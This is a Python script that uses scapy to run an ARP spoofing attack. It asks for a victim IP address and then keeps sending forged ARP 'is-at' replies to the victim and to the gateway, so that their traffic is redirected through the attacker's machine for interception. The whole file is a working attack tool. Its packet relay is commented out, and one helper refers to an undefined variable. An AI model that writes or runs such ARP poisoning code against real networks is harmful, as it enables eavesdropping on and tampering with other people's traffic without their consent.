from scapy3k.all import *
import time
import threading

victim_details = []
lan_details = {}

def get_mac(ip: str) -> str:
    """
    Gets the mac for an IP address using ARP.
    """
    return sr1(ARP(op=ARP.who_has, psrc=lan_details["my_ip"], pdst=ip))[ARP].hwsrc


def poison_arp() -> None:
    """
    Makes an ARP attack with the specified parameters.
    :return:
    """
    global lan_details
    global victim_details # for clarity
    print(victim_details)
    print(lan_details)
    try:
        while True:
            victim_packet = Ether(dst=victim_details[1]) / ARP( # Send to victim mac only
                psrc=lan_details["gateway_ip"],  # Like it came from the gateway
                op=2,  # is-at  op
                pdst=victim_details[0], # Target the falsified ARP packet to the victim pc.
                hwsrc=lan_details["my_mac"], # The victim PC needs to know which MAC to send to as the "default gateway"
                hwdst=victim_details[1])  # Send to victim only

            gateway_packet = Ether(dst=lan_details["gateway_mac"]) / ARP(  # Send to gateway only
                psrc=victim_details[0],  # as if it came from the victim pc
                op=2,  # is-at operation
                pdst=lan_details["gateway_ip"],  # the target is our default gateway
                hwsrc=lan_details["my_mac"],  # the source is our mac since we want traffic directed to us.
                hwdst=lan_details["gateway_mac"])  # dst is just the default gateway

            sendp(victim_packet, verbose=0)   # Sendp is with Ether
            sendp(gateway_packet, verbose=0)  # Send w/o expecting a response
            time.sleep(2)
    except KeyboardInterrupt:
        print("Finished bombing the victim {}".format(victim_details[0]))


def send_spoofed(packet: Packet):
    packet[Ether].dst = lan_details["gateway_mac"]

    packet.show()
    #input()
    sendp(packet)

def get_local_details() -> dict:
    p = srp1(Ether() / IP(dst="8.8.8.8", ttl=1) / UDP(sport=random.randrange(1000,50000), dport=1000) / "lorem"
    ,verbose=0)
    data_dict = {"my_mac": p[Ether].dst, "gateway_mac": p[Ether].src, "my_ip": p[IP].dst, "gateway_ip": p[IP].src}
    print(data_dict)
    return data_dict


def is_victim(packet):
    return IP in packet and packet[IP].src == victim_pc


def main():
    global lan_details
    lan_details = get_local_details()

    victim_details.append(input("Victim PC IP: "))
    victim_details.append(get_mac(victim_details[0]))

    print("Bombing victim PC with ARP replies..")
    poison_loop_thread = threading.Thread(target=poison_arp)
    poison_loop_thread.start()

    try:
        while True:
            #sniff(lfilter=is_victim, prn=send_spoofed)
            pass

    except KeyboardInterrupt:
        print("Stopped bombing")


if __name__ == '__main__':
    main()